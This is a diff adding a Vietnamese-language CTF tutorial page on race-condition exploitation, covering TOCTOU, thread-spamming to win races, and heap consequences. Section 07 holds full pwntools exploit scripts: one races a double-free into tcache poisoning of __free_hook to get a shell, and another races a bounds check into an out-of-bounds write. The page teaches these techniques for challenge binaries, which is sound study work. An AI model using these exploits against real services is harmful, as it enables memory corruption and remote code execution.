@@ -1,0 +1,494 @@
+<title>Race Condition</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,46px);line-height:1.03;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.racebox{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0;font-family:var(--font-mono);font-size:12.5px}
+.racebox .lane{display:grid;grid-template-columns:70px 1fr;gap:8px;margin:4px 0;align-items:center}
+.racebox .lane .tag{color:var(--mem);font-weight:700}
+.racebox .op{border:1px solid var(--line);border-radius:6px;padding:4px 8px;background:var(--surface);display:inline-block;transition:background .15s}
+.racebox .op.hit{background:var(--accent-soft);border-color:var(--accent);font-weight:700}
+.racebox .verdict{margin-top:10px;padding:8px 12px;border-radius:8px;font-weight:700}
+.racebox .win{background:var(--ok-soft);color:var(--ok)}
+.racebox .lose{background:var(--danger-soft);color:var(--danger)}
+.racebox button{font-family:var(--font-mono);font-size:12px;padding:6px 12px;border:1px solid var(--line);border-radius:7px;background:var(--surface);color:var(--fg);cursor:pointer}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 5 · Concurrency</div>
+    <h1>Race Condition</h1>
+    <p class="sub">Hai luồng/tiến trình chạy chen nhau → thao tác không <strong>nguyên tử</strong> bị tách giữa chừng. Khe thời gian giữa <mark>kiểm tra</mark> và <mark>dùng</mark> (TOCTOU) cho attacker chèn thay đổi: vượt kiểm quyền, double-free, ghi đè file. Bài này: race thật với <code>threading</code>, cửa sổ đua, và cách thắng đua ổn định.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Cao (Phase 5)</span>
+      <span class="chip"><b>Binary mẫu:</b> đa luồng pthread</span>
+      <span class="chip"><b>Cần trước:</b> <a href="heap_bugs.html" style="color:inherit">heap bugs</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~50 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 TOCTOU</a><a href="#s4">04 Thắng đua</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Race condition:</strong> kết quả phụ thuộc thứ tự chạy của nhiều luồng. Khi thao tác lẽ ra phải <em>nguyên tử</em> (atomic) lại gồm nhiều bước, luồng khác chen vào giữa → trạng thái sai.</p>
+    <p><strong>TOCTOU</strong> (Time-Of-Check to Time-Of-Use): chương trình kiểm điều kiện (vd "chưa free", "có quyền") rồi mới dùng — attacker đổi trạng thái trong khe đó.</p>
+    <p><strong>Pwn:</strong> double-free (2 luồng free cùng chunk), vượt kiểm quyền, size đổi giữa kiểm và cấp phát → overflow. Thắng đua bằng lặp nhiều lần + đồng bộ.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>Giữa "kiểm tra" và "dùng" có khe — chèn thay đổi vào khe đó.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Nhận dạng</span>
+<pre><code>pthread_create / fork + shared global
+if (check) { ... use } // check & use KHÔNG khóa → TOCTOU
+free trong 1 luồng, dùng lại trong luồng khác → double-free/UAF race</code></pre></div>
+      <div class="combat-row"><span class="lab">🧵 Race bằng threading (client)</span>
+<pre><code>import threading
+def hammer():
+  while not done: p.sendline(b"use idx 0")   # spam
+t=threading.Thread(target=hammer); t.start()
+p.sendline(b"free idx 0")   # đua với hammer</code></pre></div>
+      <div class="combat-row"><span class="lab">🎯 Thắng đua ổn định</span>
+        <p>Lặp N lần (100–10000); giảm jitter: gửi 2 lệnh dồn 1 packet; dùng sched_yield/nhiều thread; mở rộng cửa sổ (sleep server, buffer lớn).</p></div>
+      <div class="combat-row"><span class="lab">💥 Hệ quả</span>
+        <p>double-free → tcache poisoning. count/size đổi → overflow. auth bypass. symlink swap (TOCTOU file).</p></div>
+      <div class="combat-row"><span class="lab">⚠️ Nhớ</span>
+        <p>Race xác suất — lặp nhiều. Local ≠ remote (độ trễ khác). Đo tỉ lệ thắng, tăng vòng lặp. Kiểm bằng nhiều lần chạy.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Nguyên tử vs. không nguyên tử</h2>
+  <p>Một thao tác <span class="mem-term">nguyên tử</span> (atomic) chạy "trọn gói", không bị chen. Nhưng <code>count--</code> thực ra là 3 lệnh máy: <em>đọc</em> count → <em>trừ 1</em> → <em>ghi</em> lại. Nếu hai luồng cùng làm, cả hai đọc cùng giá trị cũ rồi ghi đè nhau → mất một lần trừ. <span class="mem-term">Race condition</span> là lỗi khi tính đúng đắn phụ thuộc thứ tự chen này. Pwn khai thác: ép hai luồng chen đúng lúc để tạo trạng thái bất hợp lệ (vd đếm số lần free sai → free 2 lần).</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">atomic</div><p>Chạy trọn gói, không chen được.</p></div>
+    <div class="card"><div class="term">race condition</div><p>Kết quả phụ thuộc thứ tự luồng.</p></div>
+    <div class="card"><div class="term">TOCTOU</div><p>Khe giữa kiểm tra và dùng.</p></div>
+    <div class="card"><div class="term">cửa sổ đua</div><p>Khoảng thời gian chen được.</p></div>
+    <div class="card"><div class="term">mutex/lock</div><p>Khóa để nối tiếp hóa (phòng thủ).</p></div>
+    <div class="card"><div class="term">data race</div><p>2 luồng chạm 1 biến, ít nhất 1 ghi.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Thiếu khóa = cửa mở</h2>
+  <p>Lập trình viên hay kiểm trước rồi làm sau: <code>if (!obj-&gt;freed) { free(obj); obj-&gt;freed=1; }</code>. Trông an toàn — nhưng nếu hai luồng cùng vào <code>if</code> khi <code>freed==0</code>, <strong>cả hai</strong> gọi <code>free</code> → double-free. Hoặc <code>if (idx &lt; count)</code> rồi dùng <code>arr[idx]</code>, nhưng luồng khác giảm <code>count</code> ở giữa → OOB. Không có <code>mutex</code> bọc cả kiểm-lẫn-dùng là có khe. Đề CTF race thường có menu đa luồng/socket mỗi kết nối một thread chia sẻ global, cố tình bỏ khóa.</p>
+ </div>
+</section>
+
+<!-- 03 TOCTOU -->
+<section class="block" id="s3">
+ <div class="wrap wide">
+  <div class="secnum">03 / TOCTOU · MỤC LÕI</div>
+  <h2>Khe giữa kiểm tra và dùng</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 600 150" role="img" aria-label="luồng 1 kiểm tra rồi dùng; luồng 2 chen vào giữa đổi trạng thái" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <g font-family="monospace" font-size="10.5">
+    <text x="12" y="30" fill="var(--mem)" stroke="none">T1:</text>
+    <rect x="45" y="18" width="110" height="26" rx="5" stroke-width="1.5" stroke="var(--mem)"/><text x="100" y="35" text-anchor="middle" fill="var(--mem)" stroke="none">if(!freed) ✓</text>
+    <rect x="360" y="18" width="110" height="26" rx="5" stroke-width="1.5" stroke="var(--mem)"/><text x="415" y="35" text-anchor="middle" fill="var(--mem)" stroke="none">free(obj)</text>
+    <line x1="155" y1="31" x2="358" y2="31" stroke="var(--mem)" stroke-width="1.2" stroke-dasharray="3 3"/>
+    <text x="12" y="95" fill="#e8663e" stroke="none">T2:</text>
+    <rect x="200" y="83" width="130" height="26" rx="5" stroke-width="1.6" stroke="#e8663e"/><text x="265" y="100" text-anchor="middle" fill="#e8663e" stroke="none">free(obj) chen!</text>
+    <text x="300" y="135" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.72">T1 đã kiểm "chưa free", T2 free trước → T1 free LẦN 2 = double-free.</text>
+    </g>
+  </svg>
+  <figcaption>Khe giữa kiểm (if !freed) và dùng (free) → luồng 2 chen → double-free.</figcaption>
+  </figure>
+  <h3>Code có lỗi (C)</h3>
+  <pre><code><span class="c">// menu đa luồng, KHÔNG khóa — mỗi request chạy 1 thread</span>
+<span class="k">void</span> do_free(<span class="k">int</span> i){
+  <span class="k">if</span> (slot[i] != <span class="d">NULL</span>){        <span class="c">// ① KIỂM (time-of-check)</span>
+     free(slot[i]);              <span class="c">// ③ DÙNG (time-of-use) — khe ②→③</span>
+     slot[i] = <span class="d">NULL</span>;
+  }
+}
+<span class="c">// 2 thread gọi do_free(0) cùng lúc: cả hai qua ①, cùng free → DOUBLE-FREE</span></code></pre>
+  <div class="note"><span class="tag">Tại sao thắng</span>Giữa ① và ③ có vài trăm chu kỳ CPU. Hai thread spam <code>do_free(0)</code> hàng nghìn lần → sớm muộn trúng khe → cùng qua ①. Kết quả double-free → <a href="tcache_fastbin.html">tcache poisoning</a>.</div>
+ </div>
+</section>
+
+<!-- 04 Thắng đua -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / THẮNG ĐUA ỔN ĐỊNH</div>
+  <h2>Race là xác suất — tăng tỉ lệ</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Lặp nhiều lần</h4>
+    <p>Mỗi lần đua xác suất nhỏ. Lặp 100–10000 lần cho đến khi trúng. Phát hiện trúng bằng crash/leak bất thường.</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Mở rộng cửa sổ</h4>
+    <p>Làm khe ②→③ dài hơn: gửi dữ liệu lớn (server bận copy), hoặc ép path chậm (file lớn, resize). Khe dài → dễ chen.</p></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Đồng bộ điểm xuất phát</h4>
+    <p>Hai thread cùng chờ một <code>barrier</code> rồi bắn đồng thời. Giảm jitter mạng: nối 2 lệnh vào 1 TCP packet (<code>p.send(a+b)</code>).</p></div></div>
+  <div class="step"><div class="n">4</div><div class="body"><h4>Nhiều thread/tiến trình</h4>
+    <p>8–16 thread spam cùng lúc tăng khả năng chen. Hoặc dùng nhiều kết nối socket song song.</p></div></div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Mô phỏng đua double-free</h2>
+  <p>Bấm "Chạy đua" nhiều lần — thứ tự chen 2 luồng ngẫu nhiên. Khi cả hai qua kiểm trước khi free → double-free. Xem tỉ lệ thắng tăng khi bạn lặp.</p>
+  <div class="lab">
+    <div class="racebox" id="rb">
+      <div class="lane"><span class="tag">T1</span><div><span class="op" id="t1a">① if(!freed)</span> <span class="op" id="t1b">③ free</span></div></div>
+      <div class="lane"><span class="tag">T2</span><div><span class="op" id="t2a">① if(!freed)</span> <span class="op" id="t2b">③ free</span></div></div>
+      <div style="margin-top:10px;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+        <button id="raceBtn">Chạy đua 1 lần</button>
+        <button id="race100Btn">Chạy 100 lần</button>
+        <span id="rbStat" style="opacity:.8"></span>
+      </div>
+      <div class="verdict" id="rbVerdict"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Luồng, biến chung, thiếu khóa</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Có đa luồng?</h4>
+    <pre><code><span class="p">$</span> nm ./chall | grep pthread   <span class="c"># pthread_create → đa luồng</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Biến chung không khóa</h4>
+    <pre><code><span class="c"># global dùng chung mà không có pthread_mutex_lock quanh check+use</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Mẫu check-then-use</h4>
+    <pre><code><span class="c"># if(cond){...}  cond là biến chung → TOCTOU ứng viên</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>Double-free race → tcache (số thật)</h2>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · threading race</button>
+    <button class="tab" data-t="b">B · TOCTOU count</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — server đa luồng (glibc 2.31), do_free() không khóa.</span>
+<span class="c"># 2 thread spam free idx 0 → double-free → tcache poisoning → __free_hook.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+<span class="k">import</span> threading
+exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = remote(<span class="s">"host"</span>, <span class="d">1337</span>)
+
+<span class="k">def</span> alloc(i,sz,data): p.sendline(f<span class="s">"alloc {i} {sz} {data}"</span>.encode())
+<span class="k">def</span> free(i):           p.sendline(f<span class="s">"free {i}"</span>.encode())
+
+<span class="c"># 1) THẮNG ĐUA double-free: 2 thread free idx 0 cùng lúc, lặp đến khi trúng</span>
+alloc(<span class="d">0</span>, <span class="d">0x50</span>, <span class="s">"A"</span>)
+hit = {<span class="s">"ok"</span>: <span class="k">False</span>}
+<span class="k">def</span> hammer():
+    <span class="k">for</span> _ <span class="k">in</span> <span class="k">range</span>(<span class="d">2000</span>):
+        <span class="k">if</span> hit[<span class="s">"ok"</span>]: <span class="k">break</span>
+        free(<span class="d">0</span>)
+t = threading.Thread(target=hammer); t.start()
+<span class="k">for</span> _ <span class="k">in</span> <span class="k">range</span>(<span class="d">2000</span>): free(<span class="d">0</span>)       <span class="c"># main thread cũng spam</span>
+hit[<span class="s">"ok"</span>] = <span class="k">True</span>; t.join()
+<span class="c"># giờ tcache[0x60] có 2 lần cùng chunk (double-free) — kiểm bằng alloc lại</span>
+
+<span class="c"># 2) tcache poisoning: alloc lấy chunk, ghi fd = __free_hook, 2 lần alloc nữa</span>
+alloc(<span class="d">1</span>, <span class="d">0x50</span>, p64(libc.sym.__free_hook))  <span class="c"># offset 0x1eee48 khi đã leak base</span>
+alloc(<span class="d">2</span>, <span class="d">0x50</span>, <span class="s">"B"</span>)
+alloc(<span class="d">3</span>, <span class="d">0x50</span>, p64(libc.sym.system))   <span class="c"># chunk 3 ĐÈ lên __free_hook</span>
+alloc(<span class="d">4</span>, <span class="d">0x50</span>, <span class="s">"/bin/sh\x00"</span>)
+free(<span class="d">4</span>)                                 <span class="c"># free → __free_hook(system)("/bin/sh")</span>
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Phần đua là lặp 2000×2 thread — số lần tùy độ trễ, tăng nếu không trúng. Sau double-free, phần tcache poisoning là kỹ thuật <a href="tcache_fastbin.html">tcache</a> chuẩn (offset <code>__free_hook=0x1eee48</code>, <code>system=0x52290</code> glibc 2.31; cần leak libc trước — qua UAF read). Đây là khung; đề thật thường cho sẵn leak.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b">
+<pre><code><span class="c"># BẢN B — TOCTOU count: if(idx&lt;count) rồi arr[idx], count giảm ở giữa.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+<span class="k">import</span> threading
+p = remote(<span class="s">"host"</span>, <span class="d">1337</span>)
+<span class="c"># thread A: liên tục "remove" (giảm count) ; thread B: "edit idx=count-1"</span>
+<span class="c"># khe: B kiểm idx&lt;count PASS, A giảm count, B ghi arr[idx] giờ OOB</span>
+done = {<span class="s">"x"</span>: <span class="k">False</span>}
+<span class="k">def</span> shrink():
+    <span class="k">while</span> <span class="k">not</span> done[<span class="s">"x"</span>]: p.sendline(b<span class="s">"remove"</span>)
+threading.Thread(target=shrink).start()
+<span class="k">for</span> _ <span class="k">in</span> <span class="k">range</span>(<span class="d">5000</span>):
+    p.sendline(b<span class="s">"edit 9 "</span> + p64(<span class="d">0xdeadbeef</span>))   <span class="c"># idx 9, race OOB write</span>
+done[<span class="s">"x"</span>] = <span class="k">True</span>
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">TOCTOU</span>Mẫu phổ biến thứ 2: kiểm biên bằng biến chung <code>count</code> rồi dùng, nhưng <code>count</code> bị luồng khác giảm giữa chừng → <a href="oob.html">OOB</a> write. Thắng đua giống hệt: spam 2 việc đối nghịch.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld + helper đua.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+<span class="k">import</span> threading
+exe=ELF(<span class="s">"./chall"</span>,checksec=<span class="k">False</span>); libc=get_libc(<span class="s">"./libc.so.6"</span>); p=remote(<span class="s">"host"</span>,<span class="d">1337</span>)
+<span class="c"># race_hammer: spam 1 lệnh trong thread tới khi cờ tắt</span>
+race_hammer(p, b<span class="s">"free 0"</span>, rounds=<span class="d">3000</span>, threads=<span class="d">4</span>)   <span class="c"># 4 thread đua</span>
+<span class="c"># rồi tcache poisoning như bản A</span></code></pre>
+<div class="note"><span class="tag">pwnld</span><code>race_hammer</code> gom nhiều thread spam. Vẫn phải hiểu cửa sổ TOCTOU + hệ quả (double-free/OOB).</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Không bao giờ trúng</h4><p>Tăng vòng lặp/thread. Mở rộng cửa sổ (data lớn). Thử remote (trễ khác).</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Crash ngẫu nhiên</h4><p>Có thể ĐÃ trúng race nhưng layout chưa đúng. Ổn định hóa sau double-free.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Local thắng, remote thua</h4><p>Jitter mạng. Dồn packet, tăng rounds, nhiều kết nối.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">threading</div><h4>Spam song song</h4><p>Nhiều thread gửi lệnh.</p></div>
+    <div class="card"><div class="term">p.send(a+b)</div><h4>Dồn packet</h4><p>Giảm jitter giữa 2 lệnh.</p></div>
+    <div class="card"><div class="term">ThreadSanitizer</div><h4>Phát hiện data race</h4><p>gcc -fsanitize=thread.</p></div>
+    <div class="card"><div class="term">strace -f</div><h4>Theo luồng</h4><p>Xem thứ tự syscall các thread.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi đua không thắng</h2>
+  <div class="grid">
+    <div class="card"><h4>Tỉ lệ 0%</h4><p>Cửa sổ quá hẹp. Mở rộng (data lớn/sleep path).</p></div>
+    <div class="card"><h4>Có mutex</h4><p>Check+use đã khóa → không race được. Tìm chỗ khác.</p></div>
+    <div class="card"><h4>GIL Python chậm</h4><p>threading bị GIL; dùng nhiều process hoặc send dồn.</p></div>
+    <div class="card"><h4>Remote thua</h4><p>Jitter. Tăng rounds, nhiều socket.</p></div>
+    <div class="card"><h4>Trúng nhưng crash</h4><p>Double-free rồi nhưng tcache layout lệch. Kiểm count free.</p></div>
+    <div class="card"><h4>tcache double-free detect</h4><p>glibc 2.29+ có key check — race vẫn qua nếu free "đồng thời" thật.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & NHẬN DIỆN</div>
+  <h2>Các kiểu race</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Kiểu</th><th>Khe & hệ quả</th></tr></thead>
+    <tbody>
+      <tr><td>Double-free race</td><td>2 free chen → tcache/fastbin dup</td></tr>
+      <tr><td>TOCTOU count/size</td><td>biên đổi giữa kiểm-dùng → OOB</td></tr>
+      <tr><td>UAF race</td><td>free + use chen → dùng chunk đã free</td></tr>
